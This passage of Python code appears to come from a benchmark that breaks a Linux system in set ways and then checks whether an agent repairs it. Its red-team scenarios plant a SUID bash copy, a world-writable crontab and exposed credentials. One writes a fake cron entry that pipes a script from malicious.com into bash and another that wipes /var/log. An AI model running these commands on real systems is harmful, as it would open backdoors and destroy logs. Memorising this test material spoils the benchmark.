    
    def validate_process_limit():
        result = run_cmd("pgrep -c 'sleep 3600' 2>/dev/null || echo 0")
        count = int(result.get("stdout", "20").strip() or "20")
        return count < 5
    
    def cleanup_process_limit():
        run_cmd("pkill -f 'sleep 3600' 2>/dev/null || true")
        run_cmd_sudo("rm -rf /tmp/proc_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Too many background sleep processes",
        description="20 unnecessary 'sleep 3600' processes are running and consuming resources.",
        difficulty=3,
        break_system=break_process_limit, validate_fix=validate_process_limit, cleanup=cleanup_process_limit,

    ))
    
    def break_config_backup():
        run_cmd_sudo("mkdir -p /tmp/config_test")
        run_cmd_sudo("echo 'important=true' > /tmp/config_test/app.conf")
        run_cmd_sudo("echo 'NEEDS_BACKUP' > /tmp/config_test/status")
        return {"broken": "Config file exists but no backup"}
    
    def validate_config_backup():
        result = run_cmd("test -f /tmp/config_test/app.conf.bak || test -f /tmp/config_test/app.conf.backup")
        return result["success"]
    
    def cleanup_config_backup():
        run_cmd_sudo("rm -rf /tmp/config_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Configuration file needs backup",
        description="The file /tmp/config_test/app.conf exists but has no backup copy.",
        difficulty=2,
        break_system=break_config_backup, validate_fix=validate_config_backup, cleanup=cleanup_config_backup,

    ))
    
    def break_script_permission():
        run_cmd_sudo("mkdir -p /tmp/script_test")
        run_cmd_sudo("echo '#!/bin/bash\necho Hello' > /tmp/script_test/run.sh")
        run_cmd_sudo("chmod 644 /tmp/script_test/run.sh")
        return {"broken": "Script is not executable"}
    
    def validate_script_permission():
        result = run_cmd("test -x /tmp/script_test/run.sh")
        return result["success"]
    
    def cleanup_script_permission():
        run_cmd_sudo("rm -rf /tmp/script_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Shell script missing execute permission",
        description="The script /tmp/script_test/run.sh is not executable.",
        difficulty=2,
        break_system=break_script_permission, validate_fix=validate_script_permission, cleanup=cleanup_script_permission,

    ))
    
    
    def break_permissions():
        run_cmd_sudo("mkdir -p /tmp/perm_test")
        run_cmd_sudo("touch /tmp/perm_test/important.txt")
        run_cmd_sudo("chmod 000 /tmp/perm_test/important.txt")
        return {"broken": "file has 000 permissions"}
    
    def validate_permissions():
        result = run_cmd("cat /tmp/perm_test/important.txt")
        return result["success"]
    
    def cleanup_permissions():
        run_cmd_sudo("rm -rf /tmp/perm_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Critical file with no permissions",
        description="File has chmod 000 and is inaccessible.",
        difficulty=2,
        break_system=break_permissions, validate_fix=validate_permissions, cleanup=cleanup_permissions,

    ))
    
    def break_symlink():
        run_cmd_sudo("rm -rf /tmp/symlink_test")
        run_cmd("mkdir -p /tmp/symlink_test")
        run_cmd("cd /tmp/symlink_test && ln -s b a && ln -s a b")
        return {"broken": "symlink loop created"}
    
    def validate_symlink():
        result = run_cmd("find /tmp/symlink_test -follow 2>&1")
        return "loop" not in result.get("stderr", "").lower()
    
    def cleanup_symlink():
        run_cmd("rm -rf /tmp/symlink_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Circular symlink loop",
        description="Symlinks a -> b -> a create infinite loop.",
        difficulty=3,
        break_system=break_symlink, validate_fix=validate_symlink, cleanup=cleanup_symlink,

    ))
    
    def break_inodes():
        run_cmd("mkdir -p /tmp/inode_test")
        run_cmd("for i in $(seq 1 10000); do touch /tmp/inode_test/file_$i; done")
        return {"broken": "10000 small files created"}
    
    def validate_inodes():
        result = run_cmd("ls /tmp/inode_test | wc -l")
        count = int(result.get("stdout", "10000").strip() or "10000")
        return count < 100
    
    def cleanup_inodes():
        run_cmd("rm -rf /tmp/inode_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Too many small files (inode pressure)",
        description="10000 tiny files consuming inodes.",
        difficulty=3,
        break_system=break_inodes, validate_fix=validate_inodes, cleanup=cleanup_inodes,

    ))
    
    def break_immutable():
        run_cmd_sudo("mkdir -p /tmp/immutable_test")
        run_cmd_sudo("echo 'locked content' > /tmp/immutable_test/locked.txt")
        run_cmd_sudo("chattr +i /tmp/immutable_test/locked.txt")
        return {"broken": "file is immutable"}
    
    def validate_immutable():
        result = run_cmd_sudo("echo 'modified' >> /tmp/immutable_test/locked.txt")
        return result["success"]
    
    def cleanup_immutable():
        run_cmd_sudo("chattr -i /tmp/immutable_test/locked.txt 2>/dev/null || true")
        run_cmd_sudo("rm -rf /tmp/immutable_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Immutable file attribute set",
        description="File has immutable flag preventing modification.",
        difficulty=4,
        break_system=break_immutable, validate_fix=validate_immutable, cleanup=cleanup_immutable,

    ))
    
    def break_owner():
        run_cmd_sudo("mkdir -p /tmp/owner_test")
        run_cmd("touch /tmp/owner_test/myfile.txt")
        run_cmd_sudo("chown root:root /tmp/owner_test/myfile.txt")
        run_cmd_sudo("chmod 600 /tmp/owner_test/myfile.txt")
        return {"broken": "file owned by root"}
    
    def validate_owner():
        result = run_cmd("cat /tmp/owner_test/myfile.txt")
        return result["success"]
    
    def cleanup_owner():
        run_cmd_sudo("rm -rf /tmp/owner_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="File ownership preventing access",
        description="User cannot access their own file due to ownership.",
        difficulty=2,
        break_system=break_owner, validate_fix=validate_owner, cleanup=cleanup_owner,

    ))
    
    
    def break_complex_deps():
        run_cmd_sudo("apt-get remove -y --allow-remove-essential curl 2>/dev/null || true")
        return {"broken": "curl removed"}
    
    def validate_complex_deps():
        result = run_cmd("curl --version")
        return result["success"]
    
    def cleanup_complex_deps():
        run_cmd_sudo("apt-get install -y curl 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Missing curl utility",
        description="curl command is not available.",
        difficulty=2,
        break_system=break_complex_deps, validate_fix=validate_complex_deps, cleanup=cleanup_complex_deps,

    ))
    
    def break_multiple_services():
        run_cmd_sudo("systemctl stop cron 2>/dev/null || true")
        run_cmd_sudo("systemctl stop rsyslog 2>/dev/null || true")
        return {"broken": "multiple services stopped"}
    
    def validate_multiple_services():
        cron = run_cmd_sudo("systemctl is-active cron")
        rsyslog = run_cmd_sudo("systemctl is-active rsyslog")
        return "active" in cron.get("stdout", "") and "active" in rsyslog.get("stdout", "")
    
    def cleanup_multiple_services():
        run_cmd_sudo("systemctl start cron 2>/dev/null || true")
        run_cmd_sudo("systemctl start rsyslog 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Multiple essential services stopped",
        description="cron and rsyslog services are both down.",
        difficulty=3,
        break_system=break_multiple_services, validate_fix=validate_multiple_services, cleanup=cleanup_multiple_services,

    ))
    
    
    def break_security_perms():
        run_cmd_sudo("touch /tmp/sensitive_config.conf")
        run_cmd_sudo("chmod 777 /tmp/sensitive_config.conf")
        return {"broken": "sensitive file world-writable"}
    
    def validate_security_perms():
        result = run_cmd("stat -c '%a' /tmp/sensitive_config.conf")
        perms = result.get("stdout", "777").strip()
        return perms in ["600", "640", "644"]
    
    def cleanup_security_perms():
        run_cmd_sudo("rm -f /tmp/sensitive_config.conf")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="World-writable sensitive file",
        description="A config file has dangerous 777 permissions.",
        difficulty=2,
        break_system=break_security_perms, validate_fix=validate_security_perms, cleanup=cleanup_security_perms,

    ))
    
    def break_suid():
        run_cmd_sudo("cp /bin/bash /tmp/suid_bash")
        run_cmd_sudo("chmod 4755 /tmp/suid_bash")
        return {"broken": "SUID bash created"}
    
    def validate_suid():
        result = run_cmd("ls -la /tmp/suid_bash 2>/dev/null")
        if not result["success"]:
            return True
        return "s" not in result.get("stdout", "")[3]
    
    def cleanup_suid():
        run_cmd_sudo("rm -f /tmp/suid_bash")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Suspicious SUID binary detected",
        description="A SUID bash shell exists in /tmp.",
        difficulty=4,
        break_system=break_suid, validate_fix=validate_suid, cleanup=cleanup_suid,

    ))
    
    def break_exposed_credentials():
        run_cmd_sudo("mkdir -p /tmp/app_config")
        run_cmd_sudo("echo '[database]' > /tmp/app_config/db.conf")
        run_cmd_sudo("echo 'host=localhost' >> /tmp/app_config/db.conf")
        run_cmd_sudo("echo 'user=admin' >> /tmp/app_config/db.conf")
        run_cmd_sudo("echo 'password=SuperSecret123!' >> /tmp/app_config/db.conf")
        run_cmd_sudo("chmod 777 /tmp/app_config/db.conf")
        return {"broken": "database credentials exposed in world-readable file"}
    
    def validate_exposed_credentials():
        result = run_cmd("stat -c '%a' /tmp/app_config/db.conf 2>/dev/null")
        perms = result.get("stdout", "").strip()
        return perms in ["600", "640", "400"] or not run_cmd("test -f /tmp/app_config/db.conf")["success"]
    
    def cleanup_exposed_credentials():
        run_cmd_sudo("rm -rf /tmp/app_config")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Exposed database credentials in config",
        description="Database credentials are stored in a world-readable config file.",
        difficulty=4,
        break_system=break_exposed_credentials, validate_fix=validate_exposed_credentials, cleanup=cleanup_exposed_credentials,

    ))
    
    def break_gcc():
        run_cmd_sudo("mv /usr/bin/gcc /usr/bin/gcc.backup 2>/dev/null || true")
        run_cmd_sudo("mv /usr/bin/g++ /usr/bin/g++.backup 2>/dev/null || true")
        return {"broken": "gcc and g++ compilers missing"}
    
    def validate_gcc():
        result = run_cmd("gcc --version")
        return result["success"]
    
    def cleanup_gcc():
        run_cmd_sudo("mv /usr/bin/gcc.backup /usr/bin/gcc 2>/dev/null || true")
        run_cmd_sudo("mv /usr/bin/g++.backup /usr/bin/g++ 2>/dev/null || true")
        run_cmd_sudo("apt install -y build-essential 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Missing GCC compiler",
        description="gcc and g++ compilers are not found.",
        difficulty=3,
        break_system=break_gcc, validate_fix=validate_gcc, cleanup=cleanup_gcc,

    ))
    
    def break_make():
        run_cmd_sudo("mv /usr/bin/make /usr/bin/make.backup 2>/dev/null || true")
        return {"broken": "make utility missing"}
    
    def validate_make():
        result = run_cmd("make --version")
        return result["success"]
    
    def cleanup_make():
        run_cmd_sudo("mv /usr/bin/make.backup /usr/bin/make 2>/dev/null || true")
        run_cmd_sudo("apt install -y make 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Missing make utility",
        description="make command is not found.",
        difficulty=2,
        break_system=break_make, validate_fix=validate_make, cleanup=cleanup_make,

    ))
    
    def break_git():
        run_cmd_sudo("mv /usr/bin/git /usr/bin/git.backup 2>/dev/null || true")
        return {"broken": "git not found"}
    
    def validate_git():
        result = run_cmd("git --version")
        return result["success"]
    
    def cleanup_git():
        run_cmd_sudo("mv /usr/bin/git.backup /usr/bin/git 2>/dev/null || true")
        run_cmd_sudo("apt install -y git 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Missing git version control",
        description="git command is not available.",
        difficulty=2,
        break_system=break_git, validate_fix=validate_git, cleanup=cleanup_git,

    ))
    
    def break_java():
        run_cmd_sudo("update-alternatives --set java /bin/false 2>/dev/null || true")
        return {"broken": "java pointing to wrong binary"}
    
    def validate_java():
        result = run_cmd("java -version 2>&1")
        return "version" in result.get("stdout", "") or "version" in result.get("stderr", "")
    
    def cleanup_java():
        run_cmd_sudo("apt install -y default-jdk 2>/dev/null || true")
        run_cmd_sudo("update-alternatives --auto java 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Broken Java installation",
        description="java command points to wrong binary.",
        difficulty=4,
        break_system=break_java, validate_fix=validate_java, cleanup=cleanup_java,

    ))
    
    def break_systemd_resolved():
        run_cmd_sudo("mkdir -p /tmp/resolved_test")
        run_cmd_sudo("echo '[Resolve]' > /tmp/resolved_test/resolved.conf")
        run_cmd_sudo("echo 'DNS=' >> /tmp/resolved_test/resolved.conf")
        run_cmd_sudo("echo 'DNSStubListener=no' >> /tmp/resolved_test/resolved.conf")
        run_cmd_sudo("touch /tmp/resolved_test/service_masked")
        return {"broken": "systemd-resolved config broken"}
    
    def validate_systemd_resolved():
        result1 = run_cmd("grep -E '^DNS=.+' /tmp/resolved_test/resolved.conf 2>/dev/null")
        result2 = run_cmd("test ! -f /tmp/resolved_test/service_masked")
        return result1["success"] or result2["success"] or not run_cmd("test -d /tmp/resolved_test")["success"]
    
    def cleanup_systemd_resolved():
        run_cmd_sudo("rm -rf /tmp/resolved_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Systemd-resolved config broken ",
        description="DNS resolver config is misconfigured.",
        difficulty=4,
        break_system=break_systemd_resolved, validate_fix=validate_systemd_resolved, cleanup=cleanup_systemd_resolved,

    ))
    
    def break_fstab():
        run_cmd_sudo("cp /etc/fstab /etc/fstab.backup")
        run_cmd_sudo("echo '/dev/nonexistent /mnt/fake ext4 defaults 0 0' >> /etc/fstab")
        return {"broken": "invalid fstab entry added"}
    
    def validate_fstab():
        result = run_cmd("grep 'nonexistent' /etc/fstab")
        return not result["success"]
    
    def cleanup_fstab():
        run_cmd_sudo("mv /etc/fstab.backup /etc/fstab 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Invalid fstab entry",
        description="/etc/fstab has an invalid mount entry.",
        difficulty=4,
        break_system=break_fstab, validate_fix=validate_fstab, cleanup=cleanup_fstab,

    ))
    
    def break_ufw():
        run_cmd_sudo("mkdir -p /tmp/ufw_test")
        run_cmd_sudo("echo 'DEFAULT_INPUT_POLICY=\"DROP\"' > /tmp/ufw_test/ufw.conf")
        run_cmd_sudo("echo 'DEFAULT_OUTPUT_POLICY=\"DROP\"' >> /tmp/ufw_test/ufw.conf")
        run_cmd_sudo("echo 'ENABLED=yes' >> /tmp/ufw_test/ufw.conf")
        return {"broken": "ufw config blocking traffic"}
    
    def validate_ufw():
        result = run_cmd("grep 'DEFAULT_OUTPUT_POLICY=\"ACCEPT\"' /tmp/ufw_test/ufw.conf 2>/dev/null || grep 'ENABLED=no' /tmp/ufw_test/ufw.conf 2>/dev/null")
        return result["success"] or not run_cmd("test -f /tmp/ufw_test/ufw.conf")["success"]
    
    def cleanup_ufw():
        run_cmd_sudo("rm -rf /tmp/ufw_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="UFW firewall config blocking traffic ",
        description="UFW config file shows blocking rules.",
        difficulty=4,
        break_system=break_ufw, validate_fix=validate_ufw, cleanup=cleanup_ufw,

    ))
    
    def break_timezone():
        run_cmd_sudo("timedatectl set-timezone 'Invalid/Timezone' 2>/dev/null || true")
        run_cmd_sudo("rm /etc/localtime 2>/dev/null || true")
        return {"broken": "timezone configuration broken"}
    
    def validate_timezone():
        result = run_cmd("timedatectl")
        return result["success"] and "Time zone:" in result.get("stdout", "")
    
    def cleanup_timezone():
        run_cmd_sudo("timedatectl set-timezone UTC")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Broken timezone configuration",
        description="System timezone is misconfigured.",
        difficulty=3,
        break_system=break_timezone, validate_fix=validate_timezone, cleanup=cleanup_timezone,

    ))
    
    def break_unauthorized_cron():
        run_cmd_sudo("mkdir -p /tmp/cron_security_test")
        run_cmd_sudo("echo '* * * * * root curl http://malicious.com/backdoor.sh | bash' > /tmp/cron_security_test/suspicious_job")
        run_cmd_sudo("echo '0 3 * * * root rm -rf /var/log/*' >> /tmp/cron_security_test/suspicious_job")
        return {"broken": "unauthorized malicious cron jobs detected"}
    
    def validate_unauthorized_cron():
        result = run_cmd("test -f /tmp/cron_security_test/suspicious_job")
        return not result["success"]
    
    def cleanup_unauthorized_cron():
        run_cmd_sudo("rm -rf /tmp/cron_security_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Unauthorized malicious cron jobs detected",
        description="Suspicious cron jobs found that download and execute remote scripts.",
        difficulty=4,
        break_system=break_unauthorized_cron, validate_fix=validate_unauthorized_cron, cleanup=cleanup_unauthorized_cron,

    ))
    
    def break_sensitive_config():
        run_cmd_sudo("mkdir -p /tmp/passwd_test")
        run_cmd_sudo("echo 'root:x:0:0:root:/root:/bin/bash' > /tmp/passwd_test/passwd_copy")
        run_cmd_sudo("echo 'user:x:1000:1000:User:/home/user:/bin/bash' >> /tmp/passwd_test/passwd_copy")
        run_cmd_sudo("chmod 666 /tmp/passwd_test/passwd_copy")
        return {"broken": "sensitive user data file is world-writable"}
    
    def validate_sensitive_config():
        result = run_cmd("stat -c '%a' /tmp/passwd_test/passwd_copy 2>/dev/null")
        perms = result.get("stdout", "").strip()
        return perms == "644" or not run_cmd("test -f /tmp/passwd_test/passwd_copy")["success"]
    
    def cleanup_sensitive_config():
        run_cmd_sudo("rm -rf /tmp/passwd_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="World-writable sensitive user file",
        description="A file containing user information has world-writable permissions.",
        difficulty=3,
        break_system=break_sensitive_config, validate_fix=validate_sensitive_config, cleanup=cleanup_sensitive_config,

    ))
    
    def break_exposed_hashes():
        run_cmd_sudo("mkdir -p /tmp/shadow_test")
        run_cmd_sudo("echo 'root:$6$xyz$hashhashhashhash:19000:0:99999:7:::' > /tmp/shadow_test/shadow_copy")
        run_cmd_sudo("echo 'user:$6$abc$hashhashhashhash:19000:0:99999:7:::' >> /tmp/shadow_test/shadow_copy")
        run_cmd_sudo("chmod 644 /tmp/shadow_test/shadow_copy")
        return {"broken": "password hashes exposed in world-readable file"}
    
    def validate_exposed_hashes():
        result = run_cmd("stat -c '%a' /tmp/shadow_test/shadow_copy 2>/dev/null")
        perms = result.get("stdout", "").strip()
        return perms in ["640", "600", "000"] or not run_cmd("test -f /tmp/shadow_test/shadow_copy")["success"]
    
    def cleanup_exposed_hashes():
        run_cmd_sudo("rm -rf /tmp/shadow_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Password hashes exposed in file",
        description="A file containing password hashes is world-readable.",
        difficulty=4,
        break_system=break_exposed_hashes, validate_fix=validate_exposed_hashes, cleanup=cleanup_exposed_hashes,

    ))
    
    def break_crontab_writable():
        run_cmd_sudo("mkdir -p /tmp/cron_test")
        run_cmd_sudo("cp /etc/crontab /tmp/cron_test/crontab.backup")
        run_cmd_sudo("chmod 666 /etc/crontab")
        return {"broken": "/etc/crontab world-writable"}
    
    def validate_crontab_writable():
        result = run_cmd("stat -c '%a' /etc/crontab")
        perms = result.get("stdout", "").strip()
        return perms in ["644", "600", "640"]
    
    def cleanup_crontab_writable():
        run_cmd_sudo("chmod 644 /etc/crontab")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.RED_TEAM,
        name="Crontab world-writable",
        description="/etc/crontab is world-writable (privilege escalation risk).",
        difficulty=3,
        break_system=break_crontab_writable, validate_fix=validate_crontab_writable, cleanup=cleanup_crontab_writable,

    ))
    
    def break_noexec_tmp():
        run_cmd_sudo("mount -o remount,noexec /tmp 2>/dev/null || true")
        return {"broken": "/tmp mounted with noexec"}
    
    def validate_noexec_tmp():
        result = run_cmd("mount | grep '/tmp'")
        stdout = result.get("stdout", "")
        return "noexec" not in stdout or not result["success"]
    
    def cleanup_noexec_tmp():
        run_cmd_sudo("mount -o remount,exec /tmp 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="/tmp mounted with noexec",
        description="Scripts cannot execute from /tmp directory.",
        difficulty=4,
        break_system=break_noexec_tmp, validate_fix=validate_noexec_tmp, cleanup=cleanup_noexec_tmp,

    ))
    
    def break_deep_directory():
        run_cmd_sudo("mkdir -p /tmp/deep_test")
        path = "/tmp/deep_test"
        for i in range(50):
            path += f"/dir{i}"
        run_cmd_sudo(f"mkdir -p {path}")
        run_cmd_sudo(f"touch {path}/trapped_file.txt")
        return {"broken": "file trapped in deep directory structure"}
    
    def validate_deep_directory():
        result = run_cmd("test -d /tmp/deep_test")
        return not result["success"]
    
    def cleanup_deep_directory():
        run_cmd_sudo("rm -rf /tmp/deep_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Deeply nested directory structure",
        description="A file is trapped 50 levels deep in directories.",
        difficulty=3,
        break_system=break_deep_directory, validate_fix=validate_deep_directory, cleanup=cleanup_deep_directory,

    ))
    
    def break_sparse_file():
        run_cmd_sudo("mkdir -p /tmp/sparse_test")
        run_cmd_sudo("dd if=/dev/zero of=/tmp/sparse_test/huge_sparse bs=1 count=0 seek=10G 2>/dev/null || true")
        return {"broken": "10GB sparse file taking space"}
    
    def validate_sparse_file():
        result = run_cmd("test -f /tmp/sparse_test/huge_sparse")
        return not result["success"]
    
    def cleanup_sparse_file():
        run_cmd_sudo("rm -rf /tmp/sparse_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Large sparse file cleanup",
        description="A 10GB sparse file needs to be removed.",
        difficulty=2,
        break_system=break_sparse_file, validate_fix=validate_sparse_file, cleanup=cleanup_sparse_file,

    ))
    
    def break_broken_pipe():
        run_cmd_sudo("mkdir -p /tmp/pipe_test")
        run_cmd_sudo("mkfifo /tmp/pipe_test/broken_pipe 2>/dev/null || true")
        run_cmd_sudo("chmod 000 /tmp/pipe_test/broken_pipe")
        return {"broken": "named pipe with no permissions"}
    
    def validate_broken_pipe():
        result = run_cmd("test -p /tmp/pipe_test/broken_pipe && test -r /tmp/pipe_test/broken_pipe")
        return result["success"] or not run_cmd("test -p /tmp/pipe_test/broken_pipe")["success"]
    
    def cleanup_broken_pipe():
        run_cmd_sudo("rm -rf /tmp/pipe_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="Named pipe with no permissions",
        description="A FIFO named pipe exists but has no read/write permissions.",
        difficulty=3,
        break_system=break_broken_pipe, validate_fix=validate_broken_pipe, cleanup=cleanup_broken_pipe,

    ))
    
    def break_ext_attrs():
        run_cmd_sudo("mkdir -p /tmp/attr_test")
        run_cmd_sudo("touch /tmp/attr_test/file.txt")
        run_cmd_sudo("setfattr -n user.blocked -v 'true' /tmp/attr_test/file.txt 2>/dev/null || true")
        run_cmd_sudo("chattr +i /tmp/attr_test/file.txt 2>/dev/null || true")
        return {"broken": "file has immutable attribute and extended attrs"}
    
    def validate_ext_attrs():
        result = run_cmd("rm /tmp/attr_test/file.txt 2>&1")
        return result["success"] or not run_cmd("test -f /tmp/attr_test/file.txt")["success"]
    
    def cleanup_ext_attrs():
        run_cmd_sudo("chattr -i /tmp/attr_test/file.txt 2>/dev/null || true")
        run_cmd_sudo("rm -rf /tmp/attr_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="File with extended attributes and immutable flag",
        description="A file has both extended attributes and immutable flag set.",
        difficulty=4,
        break_system=break_ext_attrs, validate_fix=validate_ext_attrs, cleanup=cleanup_ext_attrs,

    ))
    
    def break_acl():
        run_cmd_sudo("mkdir -p /tmp/acl_test")
        run_cmd_sudo("touch /tmp/acl_test/restricted.txt")
        run_cmd_sudo("setfacl -m u:nobody:--- /tmp/acl_test/restricted.txt 2>/dev/null || true")
        run_cmd_sudo("chmod 000 /tmp/acl_test/restricted.txt")
        return {"broken": "file has restrictive ACL and permissions"}
    
    def validate_acl():
        result = run_cmd("cat /tmp/acl_test/restricted.txt 2>/dev/null")
        return result["success"] or not run_cmd("test -f /tmp/acl_test/restricted.txt")["success"]
    
    def cleanup_acl():
        run_cmd_sudo("chmod 644 /tmp/acl_test/restricted.txt 2>/dev/null || true")
        run_cmd_sudo("setfacl -b /tmp/acl_test/restricted.txt 2>/dev/null || true")
        run_cmd_sudo("rm -rf /tmp/acl_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.FILESYSTEM_DESTRUCTION,
        name="File with restrictive ACL",
        description="A file has Access Control Lists blocking access.",
        difficulty=4,
        break_system=break_acl, validate_fix=validate_acl, cleanup=cleanup_acl,

    ))
    
    def break_orphan_lock():
        run_cmd_sudo("mkdir -p /tmp/lock_test")
        run_cmd_sudo("touch /tmp/lock_test/app.lock")
        run_cmd_sudo("echo '99999' > /tmp/lock_test/app.lock")
        return {"broken": "orphan lock file with stale PID"}
    
    def validate_orphan_lock():
        result = run_cmd("test -f /tmp/lock_test/app.lock")
        return not result["success"]
    
    def cleanup_orphan_lock():
        run_cmd_sudo("rm -rf /tmp/lock_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Orphan lock file with stale PID",
        description="An application lock file exists with a non-existent PID.",
        difficulty=3,
        break_system=break_orphan_lock, validate_fix=validate_orphan_lock, cleanup=cleanup_orphan_lock,

    ))
    
    def break_wrong_shebang():
        run_cmd_sudo("mkdir -p /tmp/shebang_test")
        run_cmd_sudo("echo '#!/usr/bin/nonexistent' > /tmp/shebang_test/script.sh")
        run_cmd_sudo("echo 'echo Hello' >> /tmp/shebang_test/script.sh")
        run_cmd_sudo("chmod +x /tmp/shebang_test/script.sh")
        return {"broken": "script with invalid shebang"}
    
    def validate_wrong_shebang():
        result = run_cmd("/tmp/shebang_test/script.sh 2>/dev/null")
        return result["success"] or "Hello" in result.get("stdout", "")
    
    def cleanup_wrong_shebang():
        run_cmd_sudo("rm -rf /tmp/shebang_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Script with invalid shebang",
        description="A shell script has an invalid interpreter path.",
        difficulty=3,
        break_system=break_wrong_shebang, validate_fix=validate_wrong_shebang, cleanup=cleanup_wrong_shebang,

    ))
    
    def break_empty_script():
        run_cmd_sudo("mkdir -p /tmp/empty_script_test")
        run_cmd_sudo("touch /tmp/empty_script_test/run.sh")
        run_cmd_sudo("chmod +x /tmp/empty_script_test/run.sh")
        return {"broken": "empty executable script"}
    
    def validate_empty_script():
        result = run_cmd("cat /tmp/empty_script_test/run.sh")
        content = result.get("stdout", "").strip()
        return len(content) > 5 and ("#!/" in content or "echo" in content)
    
    def cleanup_empty_script():
        run_cmd_sudo("rm -rf /tmp/empty_script_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Empty executable script",
        description="An executable script exists but is empty.",
        difficulty=2,
        break_system=break_empty_script, validate_fix=validate_empty_script, cleanup=cleanup_empty_script,

    ))
    
    def break_wrong_encoding():
        run_cmd_sudo("mkdir -p /tmp/encoding_test")
        run_cmd_sudo("echo -e '\\xff\\xfe' > /tmp/encoding_test/config.txt")
        run_cmd_sudo("echo 'corrupted=true' >> /tmp/encoding_test/config.txt")
        return {"broken": "config file with wrong encoding/BOM"}
    
    def validate_wrong_encoding():
        result = run_cmd("head -c 2 /tmp/encoding_test/config.txt | xxd")
        return "fffe" not in result.get("stdout", "").lower()
    
    def cleanup_wrong_encoding():
        run_cmd_sudo("rm -rf /tmp/encoding_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Config file with wrong encoding",
        description="A configuration file has a BOM marker causing parsing issues.",
        difficulty=4,
        break_system=break_wrong_encoding, validate_fix=validate_wrong_encoding, cleanup=cleanup_wrong_encoding,

    ))
    
    def break_service_unit():
        run_cmd_sudo("mkdir -p /etc/systemd/system")
        unit = """[Unit]
Description=Broken Test Service
[Service]
ExecStart=/nonexistent/path
Type=invalid
[Install]
WantedBy=multi-user.target"""
        run_cmd_sudo(f"echo '{unit}' > /etc/systemd/system/broken-test.service")
        return {"broken": "invalid systemd service unit file"}
    
    def validate_service_unit():
        result = run_cmd_sudo("systemd-analyze verify /etc/systemd/system/broken-test.service 2>&1")
        has_errors = "invalid" in result.get("stderr", "").lower() or "error" in result.get("stderr", "").lower()
        file_exists = run_cmd("test -f /etc/systemd/system/broken-test.service")["success"]
        return not file_exists or not has_errors
    
    def cleanup_service_unit():
        run_cmd_sudo("rm /etc/systemd/system/broken-test.service 2>/dev/null || true")
        run_cmd_sudo("systemctl daemon-reload")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Invalid systemd service unit file",
        description="A systemd service has invalid Type and ExecStart values.",
        difficulty=5,
        break_system=break_service_unit, validate_fix=validate_service_unit, cleanup=cleanup_service_unit,

    ))
    
    def break_ld_preload():
